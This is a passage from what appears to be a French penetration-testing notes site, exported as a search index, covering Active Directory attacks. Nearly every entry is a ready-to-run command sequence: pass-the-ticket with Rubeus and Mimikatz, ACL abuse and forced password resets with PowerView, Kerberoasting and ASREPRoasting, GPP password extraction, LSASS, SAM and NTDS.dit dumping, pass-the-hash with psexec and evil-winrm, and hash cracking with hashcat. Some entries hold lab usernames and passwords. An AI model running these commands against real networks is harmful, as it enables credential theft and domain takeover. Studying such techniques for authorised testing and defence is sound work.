(r\u00e9cup\u00e9r\u00e9 de rubeus OPtH ou encod\u00e9 \u00e0 la main)\nRubeus.exe ptt /ticket:doIE1jCCBNKgAwIBBaEDAgEWooID+TCCA/VhggPxMIID7aADAgEFoQkbB0hUQi5DT02iHDAaoAMCAQKhEzARGwZrcmJ0Z3QbB2h0Yi5jb22jggO7MIIDt6ADAgESoQMCAQKiggOpBIIDpY8Kcp4i71zFcWRgpx8ovymu3HmbOL4MJVCfkGIrdJEO0iPQbMRY2pzSrk/gHuER2XRLdV/&lt;SNIP&gt;\n</code></pre>"},{"location":"_Techniques/Windows/AD/Pass%20the%20Ticket%20%28PtT%29/#mimikatz_3","title":"Mimikatz","text":"<pre><code>mimikatz.exe privilege::debug \"kerberos::ptt ticket.kirbi\"\n</code></pre>"},{"location":"_Techniques/Windows/AD/Pass%20the%20Ticket%20%28PtT%29/#encoder-manuellement-un-kirbi-en-base-64","title":"Encoder manuellement un kirbi en base 64","text":"<pre><code>[Convert]::ToBase64String([IO.File]::ReadAllBytes(\"ticket.kirbi\"))\n</code></pre>"},{"location":"_Techniques/Windows/AD/Pass%20the%20Ticket%20%28PtT%29/#resources","title":"Resources","text":"<p>Pr\u00e9sentation parlant de PTT et de Golden Tickets (par Benjamin DELPY)</p> <p>https://www.slideshare.net/gentilkiwi/abusing-microsoft-kerberos-sorry-you-guys-dont-get-it</p>"},{"location":"_Techniques/Windows/AD/ACLs/Locale/Manuelle%20%28avec%20module%20ActiveDirectory%29/","title":"Manuelle (avec module ActiveDirectory)","text":"<pre><code>$userHavingPrivsOnAnotherOne = \"rebrec\"\n# creation d'une liste d'utilisateurs\nGet-ADUser -Filter * | Select-Object -ExpandProperty SamAccountName &gt; ad_users.txt\n\n# recher des privileges dont dispose $userHavingPrivsOnAnotherOne sur d'autres users\ngc ad_users.txt | % {get-acl  \"AD:\\$(Get-ADUser $_)\" | Select-Object Path -ExpandProperty Access | Where-Object {$_.IdentityReference -match \"$AD_DOMAIN\\\\$userHavingPrivsOnAnotherOne\"}}\n</code></pre> <p>Les ACLs collect\u00e9es r\u00e9f\u00e9rence un Guid dans la propri\u00e9t\u00e9 <code>ObjectType</code></p> <p>On peut savoir \u00e0 quoi il correspond via :</p> <pre><code>Get-ADObject -SearchBase \"CN=Extended-Rights,$((Get-ADRootDSE).ConfigurationNamingContext)\" -Filter {ObjectClass -like 'ControlAccessRight'} -Properties * |Select Name,DisplayName,DistinguishedName,rightsGuid| ?{$_.rightsGuid -eq $guid} | fl\n</code></pre>"},{"location":"_Techniques/Windows/AD/ACLs/Locale/PowerView/","title":"PowerView","text":""},{"location":"_Techniques/Windows/AD/ACLs/Locale/PowerView/#enumeration-des-acls","title":"Enum\u00e9ration des ACLs","text":"<pre><code>. .\\PowerView.ps1\n# ACLs int\u00e9ressantes (tr\u00e8s long)\nFind-InterestingDomainAcl\n\n# ACLs li\u00e9es \u00e0 un compte sp\u00e9cifique ($targetUserName)\n$sid = Convert-NameToSid $targetUserName \n# peu prendre beaucoup de temps (plusieures minutes vois dizaines de minutes)\nGet-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid} \n</code></pre>"},{"location":"_Techniques/Windows/AD/ACLs/Locale/PowerView/#exploitation-de-privileges-en-notre-possession","title":"Exploitation de privil\u00e8ges en notre possession","text":"<p>On s'appuiera souvent sur des informations d'identification diff\u00e9rentes d'un compte pr\u00e9alablement compris.</p> <p>Dans ce cas, on utilisera le parametre <code>-Credential $creds</code> avec un objet PSCredential cr\u00e9\u00e9 de la fa\u00e7on suivante :</p> <pre><code>$pass = \"somePass\"\n$user = \"DOMAIN\\someuser\"\n$creds = New-Object System.Management.Automation.PSCredential($user, (ConvertTo-SecureString $pass -AsPlainText -Force))\n</code></pre>"},{"location":"_Techniques/Windows/AD/ACLs/Locale/PowerView/#writeowner-appropriation-dun-objet","title":"WriteOwner (appropriation d'un objet)","text":"<p>Permet de s'approprier un objet pour ensuite acc\u00e9der \u00e0 ses propri\u00e9t\u00e9s et ajouter d'autres ACLs (par exemple l'ajout du droit ForceChangePassword)</p> <pre><code># Appropriation d'un utilisateur (lorsqu'on a un droit WriteOwner r\u00e9f\u00e9renc\u00e9 dans Bloodhound)\nSet-DomainObjectOwner -Identity $targetUser -OwnerIdentity $compromisedUser\n# Ajout d'une ACL sur le compte appropri\u00e9 pour r\u00e9initialiser le password :\nAdd-DomainObjectAcl -TargetIdentity $targetUser -PrincipalIdentity source_user -Rights ResetPassword\n</code></pre>"},{"location":"_Techniques/Windows/AD/ACLs/Locale/PowerView/#forcechangepassword-modification-du-mot-de-passe","title":"ForceChangePassword (modification du mot de passe)","text":"<p>Windows</p> <pre><code># Target to reset password\n$TargedUser = 'ssmalls'\n$TargetNewPass = 'NewPass@Pentest@'\n# Privileged user that can ForceChangePassword\n$PrivUser = 'INLANEFREIGHT.LOCAL\\hporter'\n$PrivPassword = 'Gr8hambino!'\n\n$SecPassword = ConvertTo-SecureString $PrivPassword -AsPlainText -Force \n$Cred = New-Object System.Management.Automation.PSCredential($PrivUser, $SecPassword)\n$NewSecPassword = ConvertTo-SecureString $TargetNewPass -AsPlainText -Force\nSet-DomainUserPassword -Identity $TargedUser -AccountPassword $NewSecPassword -Credential $Cred\n</code></pre> <p>Linux</p> <pre><code># autres m\u00e9thodes disponibles (voir l'aide de bloodhound)\nnet rpc password \"TargetUser\" \"newP@ssword2022\" -U \"DOMAIN\"/\"ControlledUser\"%\"Password\" -S \"DomainController\"\n</code></pre>"},{"location":"_Techniques/Windows/AD/ACLs/Locale/PowerView/#genericwrite","title":"GenericWrite","text":"<p>Permet :</p> <ul> <li>l'ajout d'un utitilisateur comme membre d'un groupe sur le quel on dispose de ce droit</li> <li>la modification du script de login pour tenter une ex\u00e9cution de code \u00e0 distance (au prochain logon)</li> </ul> <pre><code>Add-DomainGroupMember -Identity \"Target Group With GenericWrite right\" -Members 'compromised'\n# Verification\nGet-DomainGroupMember -Identity \"Target Group With GenericWrite right\" | ?{$_.MemberName -eq 'compromised'}\n</code></pre>"},{"location":"_Techniques/Windows/AD/ACLs/Locale/PowerView/#genericall","title":"GenericAll","text":""},{"location":"_Techniques/Windows/AD/ACLs/Locale/PowerView/#sur-un-compte-utilisateur","title":"Sur un compte utilisateur","text":"<ul> <li>Permet de r\u00e9cup\u00e9rer le hash du mot de passe d'un utilisateur sur lequel on dispose de ce privil\u00e8ge.</li> <li>L'attaque se nomme \"Targetted Kerberoasting\".</li> <li>Elle conciste en la cr\u00e9ation d'un SPN sur le compte cible afin de r\u00e9cup\u00e9rer un TGS \u00e0 cracker hors ligne.</li> <li>Si le mot de passe est facile \u00e0 deviner, on pourra le casser comme dans une attaque de Kerberoasting classique ([[Cassage de mots de passes Kerberos]])</li> </ul> <pre><code># Cr\u00e9ation d'un faux SPN pour pouvoir r\u00e9cup\u00e9rer un TGS\nSet-DomainObject -Identity $targetedUser -SET @{serviceprincipalname='nonexistent1/BLAHBLAH'}\n# R\u00e9cup\u00e9ration du TGS\nGet-DomainUser $targetedUser | Get-DomainSPNTicket | fl\n# Cleanup\nSet-DomainObject -Identity $targetedUser -Clear serviceprincipalname\n</code></pre>"},{"location":"_Techniques/Windows/AD/ACLs/Locale/PowerView/#sur-un-groupe","title":"Sur un groupe","text":"<ul> <li>elle permet de s'ajouter comme membre du groupe</li> </ul>"},{"location":"_Techniques/Windows/AD/ACLs/Locale/PowerView/#sur-une-ou","title":"Sur une OU","text":"<ul> <li>elle permet d'ajouter un controle total sur l'OU et disposer d'un controle totale sur les objets qui sont dedans</li> </ul>"},{"location":"_Techniques/Windows/AD/ACLs/Locale/PowerView/#writedacl","title":"WriteDacl","text":"<p>Permet d'ajouter des DACL sur un compte utilisateur.</p> <p>Cela peut permettre d'ajouter les permissions <code>DS-Replication-Get-Changes</code>, <code>DS-Replication-Get-Changes-All</code> et <code>DS-Replication-Get-Changes-In-Filtered-Set</code> qui permettent de r\u00e9aliser une attaque ([[DCSync]])</p>"},{"location":"_Techniques/Windows/AD/Kerberos/ASREPRoasting/","title":"ASREPRoasting","text":"<p>N\u00e9cessite une authentification LDAP valide</p> <p>Obtention de la liste des utilisateurs n'ayant pas besoin de pr\u00e9authentifaction.</p> <p>Apr\u00e8s obtention de cette liste, on pourra tenter de casser les mots de passe des utilisateurs.</p>"},{"location":"_Techniques/Windows/AD/Kerberos/ASREPRoasting/#a-distance","title":"A distance","text":"<pre><code>crackmapexec ldap  $TARGET -u \"$AD_USER\" -p \"$AD_PASSWORD\" --asreproast asrep.txt\n\n# NULL SESSION\nGetNPUsers.py \"$DOMAIN/\" -dc-ip $TARGET -request -outputfile ASREProastables.txt\n\n\n# Sans authentification\nGetNPUsers.py -usersfile users-valid.txt -dc-ip $TARGET -dc-host $DC_HOST $DOMAIN/ -outputfile asreproastable.txt -format hashcat\n\nproxychains -q GetNPUsers.py -hashes \"$PASSWORD\" -dc-ip \"$DC\" \"$DOMAIN/$USER\" -debug\n\n# Powerview\nGet-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl\n\n.\\Rubeus.exe asreproast /user:mmorgan /nowrap /format:hashcat /domain:&lt;domain&gt;\n\n# A VERIFIER NE SEMBLE RIN AVOIR 0 FAIRE ICI\n# kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt \n</code></pre> <p>Cassage du mot de passe avec hashcat  : mode 18200</p> <p>[[docs/_Techniques/Mots de passe/Casser un mot de passe/Hashcat]]</p>"},{"location":"_Techniques/Windows/AD/Kerberos/Kerberoasting/Cassage%20de%20mots%20de%20passes%20Kerberos/","title":"Cassage de mots de passes Kerberos","text":""},{"location":"_Techniques/Windows/AD/Kerberos/Kerberoasting/Cassage%20de%20mots%20de%20passes%20Kerberos/#cracker-les-hash","title":"Cracker les hash","text":"<pre><code>hashcat -m 13100 --force -a 0 hash.txt dict.txt\n</code></pre>"},{"location":"_Techniques/Windows/AD/Kerberos/Kerberoasting/Cassage%20de%20mots%20de%20passes%20Kerberos/#information-sur-les-format-de-hash","title":"information sur les format de hash","text":"<pre><code>$krb5tgs$23$* : RC4 (type 23) \n$krb5tgs$18$* : AES-256 (type 18)  (plus lent \u00e0 casser)\n</code></pre>"},{"location":"_Techniques/Windows/AD/Kerberos/Kerberoasting/Kerberoasting/","title":"Kerberoasting","text":""},{"location":"_Techniques/Windows/AD/Kerberos/Kerberoasting/Kerberoasting/#sources","title":"Sources","text":"<ul> <li>https://dl.packetstormsecurity.net/papers/general/kerberoasting.pdf</li> </ul>"},{"location":"_Techniques/Windows/AD/Kerberos/Kerberoasting/Kerberoasting/#objectifs","title":"Objectifs","text":"<ul> <li>Obtenir une liste de compte utilisateurs disposant d'un SPN</li> <li>Collecter les ST (tickets de service) associ\u00e9s \u00e0 ces SPNs (chiffr\u00e9s en RC4)</li> <li>Tenter de cracker les mots de passe des comptes utilisateurs \u00e0 partir des TGS r\u00e9cup\u00e9r\u00e9s (qui sont chiffr\u00e9s avec les hash de comptes utilisateurs respectifs)</li> </ul>"},{"location":"_Techniques/Windows/AD/Kerberos/Kerberoasting/Kerberoasting/#methodologie","title":"M\u00e9thodologie","text":"<ul> <li>A Distance : [[GetUserSPNs.py]]</li> <li>Localement<ul> <li>[[Manuel]]</li> <li>[[docs/_Techniques/Windows/AD/Kerberos/Kerberoasting/Locale/Powerview]]</li> <li>[[Rubeus]]</li> </ul> </li> </ul>"},{"location":"_Techniques/Windows/AD/Kerberos/Kerberoasting/Kerberoasting/#cracker-les-hash-bruteforce","title":"Cracker les hash (bruteforce)","text":"<pre><code>john --wordlist=/path/to/rockyou.txt hashes.txt\n</code></pre>"},{"location":"_Techniques/Windows/AD/Kerberos/Kerberoasting/Kerberoasting/#cassage-avec-hashcat","title":"Cassage avec hashcat","text":"<p>Hash de TGS  (kerberoasting)   $krb5tgs$23$*user1$DOMAIN...</p> <p>hashcat -m 13100 hash.txt rockyou.txt</p> <p>[[_Techniques/Mots de passe/Casser un mot de passe/Hashcat]]</p>"},{"location":"_Techniques/Windows/AD/Kerberos/Kerberoasting/Distant/GetUserSPNs.py/","title":"GetUserSPNs.py","text":""},{"location":"_Techniques/Windows/AD/Kerberos/Kerberoasting/Distant/GetUserSPNs.py/#impacket","title":"Impacket","text":""},{"location":"_Techniques/Windows/AD/Kerberos/Kerberoasting/Distant/GetUserSPNs.py/#utiliser-getuserspnspy","title":"Utiliser GetUserSPNs.py","text":"<p>Il r\u00e9alise les op\u00e9rations suivantes :</p> <ul> <li>d\u00e9couverte des SPNs</li> <li>Dump des TGS</li> <li>Obtention des Hashs</li> </ul> <pre><code># remarque : on peut utliser -target-domain &lt;domain&gt; si on veut attaquer un autre domaine \n\n# Liste des comptes disposant d'un SPN\nGetUserSPNs.py -dc-ip $TARGET $DOMAIN/$USER:$PASSWORD\n\n# R\u00e9cup\u00e9ration des TGS (ajout de -request)\nGetUserSPNs.py -dc-ip $TARGET $DOMAIN/$USER:$PASSWORD -request\n\n# R\u00e9cup\u00e9ration d'un unique TGS\nGetUserSPNs.py -dc-ip $TARGET $DOMAIN/$USER:$PASSWORD -request-user interesting.user\n\n# Enregistrement des TGS pour les fournier \u00e0 john / hashcat (fichier 'hashes.txt')\nGetUserSPNs.py -dc-ip $TARGET $DOMAIN/$USER:$PASSWORD -request -outputfile hash_kerberoastables.txt\n</code></pre>"},{"location":"_Techniques/Windows/AD/Kerberos/Kerberoasting/Locale/Manuel/","title":"Manuel","text":""},{"location":"_Techniques/Windows/AD/Kerberos/Kerberoasting/Locale/Manuel/#recuperer-un-tgs","title":"R\u00e9cup\u00e9rer un TGS","text":""},{"location":"_Techniques/Windows/AD/Kerberos/Kerberoasting/Locale/Manuel/#liste-des-comptes-avec-leurs-spns","title":"Liste des comptes avec leurs SPNs","text":"<pre><code># Enum\u00e9rer tous les SPNs\nsetspn.exe -q */*\n</code></pre>"},{"location":"_Techniques/Windows/AD/Kerberos/Kerberoasting/Locale/Manuel/#demande-dun-tgs","title":"Demande d'un TGS","text":"<pre><code># Demander un TGS pour le SPN d\u00e9sir\u00e9 (compte utilisateur)\nAdd-Type -AssemblyName System.IdentityModel\nNew-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList \"MyUSERWithSPN/srvtest.domain.local\"\n</code></pre>"},{"location":"_Techniques/Windows/AD/Kerberos/Kerberoasting/Locale/Manuel/#demander-tous-les-tgs-existants","title":"Demander tous les TGS existants","text":"<p>Attention, cela ne sera pas du tout furtif !</p> <pre><code># Demander tous les TGS possibles\nAdd-Type -AssemblyName System.IdentityModel\nsetspn.exe -T DOMAIN.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }\n</code></pre>"},{"location":"_Techniques/Windows/AD/Kerberos/Kerberoasting/Locale/Manuel/#extraire-le-ou-les-tickets-tgs","title":"Extraire le ou les Tickets (TGS)","text":"<p>Une fois les TGS g\u00e9n\u00e9r\u00e9s par le KDC et stock\u00e9s dans le syst\u00e8me d'exploitation, on peut les r\u00e9cup\u00e9rer via <code>Mimikatz</code>.</p> <pre><code>mimikatz # base64 /out:true    &lt;==== si on veut les transf\u00e9rer par copier / coller par exemple\nmimikatz # base64 /out:true    &lt;==== si on veut g\u00e9n\u00e9rer des fichiers .kirbi\n\nmimikatz # kerberos::list /export  \n</code></pre> <pre><code># conversion depuis base64\necho \"&lt;base64 blob&gt;\" |  tr -d \\\\n | base64 -d &gt; myUser.kirbi\n# Extraction du hash pour l'utiliser avec john / hashcat\nkirbi2john.py myUser.kirbi &gt; vmware.hash\nsed 's/\\$krb5tgs\\$\\(.*\\):\\(.*\\)/\\$krb5tgs\\$23\\$\\*\\1\\*\\$\\2/' myuser.hash &gt; myUser_tgs_hashcat\n</code></pre> <p>[[Cassage de mots de passes Kerberos]]</p>"},{"location":"_Techniques/Windows/AD/Kerberos/Kerberoasting/Locale/Powerview/","title":"Powerview","text":"<pre><code># Extract TGS Tickets\nImport-Module .\\PowerView.ps1\nGet-DomainUser * -spn | select samaccountname\n# Using PowerView to Target a Specific User\nGet-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat\n\n# Exporting All Tickets to a CSV File\nGet-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\\tgs.csv -NoTypeInformation\n</code></pre> <p>[[Cassage de mots de passes Kerberos]]</p>"},{"location":"_Techniques/Windows/AD/Kerberos/Kerberoasting/Locale/Rubeus/","title":"Rubeus","text":"<p>Il r\u00e9alise les op\u00e9rations suivantes :</p> <ul> <li>d\u00e9couverte des SPNs</li> <li>Dump des TGS</li> <li>Obtention des Hashs</li> </ul> <pre><code># affiche un r\u00e9capitulatif des comptes avec des SPNs \n# d\u00e9taille certaines informations telles que :\n# - les comptes dont le mot de passe est ancien\n# - le nombre de comptes par m\u00e9thode de hachage (rc4, aes128 etc)\n./Rubeus.exe kerberoast /stats\n\n# demande de TGS pour les comptes ayant 'Admincount' \u00e0 1\n./Rubeus.exe kerberoast /ldapfilter:'admincount=1'\n\n# Demande du TGS pour un utilisateur particulier pour un domaine particulier\n./Rubeus.exe kerberoast /user:mssqlsvc /domain:domain.loca /nowrap\n\n./Rubeus.exe kerberoast /outfile:hash.txt\n</code></pre> <p>[[Cassage de mots de passes Kerberos]]</p>"},{"location":"_Techniques/Windows/AD/Kerberos/Kerberoasting/Locale/Rubeus/#affichage-de-tous-les-tickets-kerberos","title":"Affichage de tous les tickets kerberos","text":"<p>De l'utilisateur courant ou de tous ce qui est sur le syst\u00e8me (si admin)</p> <pre><code>.\\Rubeus.exe triage\n</code></pre>"},{"location":"_Techniques/Windows/AD/Kerberos/Kerberoasting/Locale/Rubeus/#references","title":"R\u00e9f\u00e9rences","text":"<ul> <li>https://specterops.gitbook.io/ghostpack/rubeus/ticket-extraction-and-harvesting3</li> <li>https://www.hackingarticles.in/a-detailed-guide-on-rubeus/</li> </ul>"},{"location":"_Techniques/Windows/AD/Mauvaises%20configuration%20communes/Elements%20de%20configuration%20%C3%A0%20regarder/","title":"Elements de configuration \u00e0 regarder","text":""},{"location":"_Techniques/Windows/AD/Mauvaises%20configuration%20communes/Elements%20de%20configuration%20%C3%A0%20regarder/#printer-bug","title":"Printer Bug","text":"<p>https://www.thehacker.recipes/ad/movement/mitm-and-coerced-authentications/ms-rprn</p>"},{"location":"_Techniques/Windows/AD/Mauvaises%20configuration%20communes/Elements%20de%20configuration%20%C3%A0%20regarder/#sniffer-des-identifiants-ldap","title":"Sniffer des identifiants LDAP","text":"<p>On peut parfois acc\u00e9der \u00e0 des \u00e9quipements ayant une configuration ldap (par exemple un photocopieur avec la fonction scan to mail.</p> <p>Dans ce cas, on peut tenter de modifier l'IP du serveur LDAP vers notre propre machine et \"tester\" la connection pour intercepter les identifiants / mot de passe.</p> <p>)</p>"},{"location":"_Techniques/Windows/AD/Mauvaises%20configuration%20communes/Elements%20de%20configuration%20%C3%A0%20regarder/#mot-de-passe-non-requis-password-not-req","title":"Mot de passe non requis (PASSWORD NOT REQ)","text":"<pre><code>Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol\n\ncrackmapexec ldap &lt;IP&gt; -u &lt;User&gt; -p &lt;Password&gt; --kdcHost &lt;Host&gt;  --password-not-required\n</code></pre>"},{"location":"_Techniques/Windows/AD/Mauvaises%20configuration%20communes/Elements%20de%20configuration%20%C3%A0%20regarder/#identifiants-dans-les-partages-smb","title":"Identifiants dans les partages SMB","text":""},{"location":"_Techniques/Windows/AD/Mauvaises%20configuration%20communes/Elements%20de%20configuration%20%C3%A0%20regarder/#mots-de-passes-de-gpp-strategies-de-groupes-de-preference","title":"Mots de passes de GPP (Strat\u00e9gies de groupes de pr\u00e9f\u00e9rence)","text":"<pre><code>crackmapexec smb -L | grep gpp\ncrackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M gpp_autologin\ncrackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M gpp_password\nGet-GPPAutologon.ps1 (Powersploit)\n</code></pre>"},{"location":"_Techniques/Windows/AD/Mauvaises%20configuration%20communes/Elements%20de%20configuration%20%C3%A0%20regarder/#asreproasting","title":"ASRepRoasting","text":"<p>[[ASREPRoasting]]</p>"},{"location":"_Techniques/Windows/AD/Mauvaises%20configuration%20communes/Elements%20de%20configuration%20%C3%A0%20regarder/#gpo-abuse","title":"GPO Abuse","text":""},{"location":"_Techniques/Windows/AD/Mauvaises%20configuration%20communes/Elements%20de%20configuration%20%C3%A0%20regarder/#enumeration","title":"Enumeration","text":"<p>group3r,\u00a0ADRecon,\u00a0PingCastle,</p> <p>Get-DomainGPO (poweview)</p> <pre><code>Get-DomainGPO | Select DisplayName\nGet-GPO -All | Select DisplayName\n\n$sid=Convert-NameToSid \"Domain Users\"\nGet-DomainGPO | Get-ObjectAcl | ?{$_.SecurityIdentifier -eq $sid}\n</code></pre>"},{"location":"_Techniques/Windows/AD/Mauvaises%20configuration%20communes/Elements%20de%20configuration%20%C3%A0%20regarder/#exploitation","title":"Exploitation","text":"<p>SharpGPOAbuse</p>"},{"location":"_Techniques/Windows/AD/Mauvaises%20configuration%20communes/Exchange/","title":"Exchange","text":""},{"location":"_Techniques/Windows/AD/Mauvaises%20configuration%20communes/Exchange/#enumeration","title":"Enumeration","text":"<p>Pr\u00e9sence des groupes :</p> <ul> <li>Exchange Windows Permissions : les membres ont la permission Write DACL sur le domaine (DCSync)</li> <li>Organization Management :<ul> <li>acc\u00e8s aux bo\u00eetes mail</li> <li>contr\u00f4le totale sur l'OU \"Microsoft Exchange Security Groups\" qui contient le groupe pr\u00e9c\u00e9dent (Exchange Windows Permissions)</li> </ul> </li> </ul> <p>Le dump des comptes en m\u00e9moire permet \u00e9galement de r\u00e9cup\u00e9rer de nombreuses informations d'identifications (via OWA)</p>"},{"location":"_Techniques/Windows/AD/Mauvaises%20configuration%20communes/Exchange/#attaques","title":"Attaques","text":""},{"location":"_Techniques/Windows/AD/Mauvaises%20configuration%20communes/Exchange/#privexchange","title":"PrivExchange","text":"<p>Vuln\u00e9rabilit\u00e9 permettant a un utilisateur standard de forcer l'authentification du service (SYSTEM) vers une machine de son choix</p> <p>https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/</p> <p>PoC : https://github.com/dirkjanm/PrivExchange</p> <p>R\u00e9f\u00e9rences :</p> <ul> <li>https://github.com/gdedrouas/Exchange-AD-Privesc</li> </ul>"},{"location":"_Techniques/Windows/Dump%20de%20credentials/Dump%20LSASS%20et%20extraction%20de%20secrets/","title":"Dump LSASS et extraction de secrets","text":""},{"location":"_Techniques/Windows/Dump%20de%20credentials/Dump%20LSASS%20et%20extraction%20de%20secrets/#dump-de-lsass","title":"DUMP de LSASS","text":""},{"location":"_Techniques/Windows/Dump%20de%20credentials/Dump%20LSASS%20et%20extraction%20de%20secrets/#localement","title":"Localement","text":""},{"location":"_Techniques/Windows/Dump%20de%20credentials/Dump%20LSASS%20et%20extraction%20de%20secrets/#generation-dun-dump-via-le-gestionnaire-de-taches","title":"G\u00e9n\u00e9ration d'un dump via le gestionnaire de t\u00e2ches","text":"<p>Bouton droit sur  le processus &gt; Cr\u00e9er un fichier dump</p> <p>Le fichier est cr\u00e9\u00e9 dans le dossier %TEMP%</p>"},{"location":"_Techniques/Windows/Dump%20de%20credentials/Dump%20LSASS%20et%20extraction%20de%20secrets/#via-procdumpexe-sysinternals","title":"Via Procdump.exe (sysinternals)","text":"<pre><code>procdump.exe -accepteula -ma lsass.exe lsass.dmp\n</code></pre>"},{"location":"_Techniques/Windows/Dump%20de%20credentials/Dump%20LSASS%20et%20extraction%20de%20secrets/#rundll32exe-comsvcsdll","title":"Rundll32.exe &amp; Comsvcs.dll","text":"<ul> <li>Trouver le pid de lsass :<ul> <li><code>tasklist /svc</code></li> <li><code>Get-Process lsass</code></li> </ul> </li> <li>Cr\u00e9er le dump (pid = 672) :<ul> <li><code>rundll32 C:\\windows\\system32\\comsvcs.dll, MiniDump 672 C:\\lsass.dmp full</code></li> </ul> </li> </ul>"},{"location":"_Techniques/Windows/Dump%20de%20credentials/Dump%20LSASS%20et%20extraction%20de%20secrets/#a-distance","title":"A distance","text":"<pre><code>crackmapexec smb $TARGET_IP --local-auth -u $LOCAL_USER -p $LOCAL_PASS --lsa\n</code></pre>"},{"location":"_Techniques/Windows/Dump%20de%20credentials/Dump%20LSASS%20et%20extraction%20de%20secrets/#extraction-dinformations-didentification","title":"Extraction d'informations d'identification","text":"<pre><code># depuis windows dans mimikatz : (ne touche qu'au dump, pas au precessus)\nsekurlsa::minidump lsass.dmp\nsekurlsa::logonPasswords\n\n# depuis linux\npypykatz lsa minidump /home/peter/Documents/lsass.dmp\n</code></pre> <p>Extractions des mots de passe en cache (permettant de se connecter sans connectivit\u00e9 r\u00e9seau)</p> <pre><code>lsadump::cache\n</code></pre>"},{"location":"_Techniques/Windows/Dump%20de%20credentials/Dump%20de%20la%20SAM/","title":"Dump de la SAM","text":""},{"location":"_Techniques/Windows/Dump%20de%20credentials/Dump%20de%20la%20SAM/#localement","title":"Localement","text":""},{"location":"_Techniques/Windows/Dump%20de%20credentials/Dump%20de%20la%20SAM/#recuperation-de-la-sam","title":"R\u00e9cup\u00e9ration de la SAM","text":"<pre><code>reg save hklm\\sam sam.save\nreg save hklm\\system system.save\nreg save hklm\\security security.save\n\n\nSET TARGET=172.16.5.225\nreg save hklm\\sam \\\\%TARGET%\\share\\sam.save\nreg save hklm\\system \\\\%TARGET%\\share\\system.save\nreg save hklm\\security \\\\%TARGET%\\share\\security.save\n</code></pre> <p>Cr\u00e9ation d'un clich\u00e9 instantan\u00e9 si besoin</p> <pre><code>wmic shadowcopy call create Volume=\"C:\\\"\n</code></pre> <p>Liste des clich\u00e9s disponibles</p> <pre><code>vssadmin.exe list shadows # Noter la ligne 'Shadow Copy Volume: \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy3'\n\nmkdir C:\\temp\ncopy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy3\\Windows\\System32\\config\\SYSTEM C:\\temp\\SYSTEM\ncopy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy3\\Windows\\System32\\config\\SAM C:\\temp\\SAM\n</code></pre>"},{"location":"_Techniques/Windows/Dump%20de%20credentials/Dump%20de%20la%20SAM/#mimikatz","title":"Mimikatz","text":"<pre><code>PS &gt; .\\mimikatz.exe privilege::debug sekurlsa::logonpasswords exit &gt; mimikatz_output.txt\n\nmimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" \"exit\" &gt;&gt; c:\\tmp\\mimikatz_output.txt\nmimikatz.exe \"privilege::debug; sekurlsa::logonpasswords; exit\" &gt;&gt; mimikatz_output.txt\n\n\n\n**powershellz** \\\\172.16.5.225\\share\\mimikatz.exe privilege::debug sekurlsa::logonpasswords exit\n</code></pre>"},{"location":"_Techniques/Windows/Dump%20de%20credentials/Dump%20de%20la%20SAM/#a-distance","title":"A distance","text":"<pre><code>crackmapexec smb $TARGET_IP --local-auth -u $LOCAL_USER -p $LOCAL_PASS --sam\n</code></pre>"},{"location":"_Techniques/Windows/Dump%20de%20credentials/Dump%20de%20la%20SAM/#extraction-des-hashs","title":"Extraction des Hashs","text":""},{"location":"_Techniques/Windows/Dump%20de%20credentials/Dump%20de%20la%20SAM/#sam","title":"SAM","text":"<pre><code>secretsdump.py local -sam sam.save -security security.save -system system.save LOCAL\n</code></pre>"},{"location":"_Techniques/Windows/Dump%20de%20credentials/Dump%20de%20la%20SAM/#utilisation-des-hash-lmnt","title":"Utilisation des Hash LM:NT","text":""},{"location":"_Techniques/Windows/Dump%20de%20credentials/Dump%20de%20la%20SAM/#acces-distant","title":"Acc\u00e8s distant","text":"<pre><code>psexec.py Administrator@$TARGET_IP -hashes xxxxxxxxxxxxxxxxx:xxxxxxxxxxxxxxxxxxxxxxx\n# ou\npsexec.py Administrator@$TARGET_IP -hashes :xxxxxxxxxxxxxxxxxxxxxxx\n# on peut \u00e9galement utiliser wmiexec.py et smbexec.py ou encore evil-winrm\nevil-winrm -i $TARGET_IP -u Administrator -H \"64f12cddaa88057e06a81b54e73b949b\"\n</code></pre>"},{"location":"_Techniques/Windows/Dump%20de%20credentials/Dump%20de%20la%20SAM/#cassage-des-hashs-avec-hashcat","title":"Cassage des hashs avec hashcat","text":"<pre><code>cat hash.txt\n64f12cddaa88057e06a81b54e73b949b\n31d6cfe0d16ae931b73c59d7e0c089c0\n...\n\nsudo hashcat -m 1000 hash.txt /usr/share/wordlists/rockyou.txt\n</code></pre>"},{"location":"_Techniques/Windows/Dump%20de%20credentials/NTDS.dit/","title":"NTDS.dit","text":""},{"location":"_Techniques/Windows/Dump%20de%20credentials/NTDS.dit/#dump-dntdsdit","title":"Dump d'NTDS.dit","text":""},{"location":"_Techniques/Windows/Dump%20de%20credentials/NTDS.dit/#localement","title":"Localement","text":""},{"location":"_Techniques/Windows/Dump%20de%20credentials/NTDS.dit/#cliche-instantane-vssadmin","title":"Clich\u00e9 instantan\u00e9 (vssadmin)","text":""},{"location":"_Techniques/Windows/Dump%20de%20credentials/NTDS.dit/#creer-une-shadow-copy-cliche-instantanne-du-disque-c","title":"Cr\u00e9er une Shadow Copy (clich\u00e9 instantann\u00e9) du disque C","text":"<p>La base NTDS.dit est par d\u00e9faut stock\u00e9e dans <code>C:\\Windows\\NTDS</code></p> <pre><code>vssadmin CREATE SHADOW /For=C:\n\nvssadmin 1.1 - Volume Shadow Copy Service administrative command-line tool\n(C) Copyright 2001-2013 Microsoft 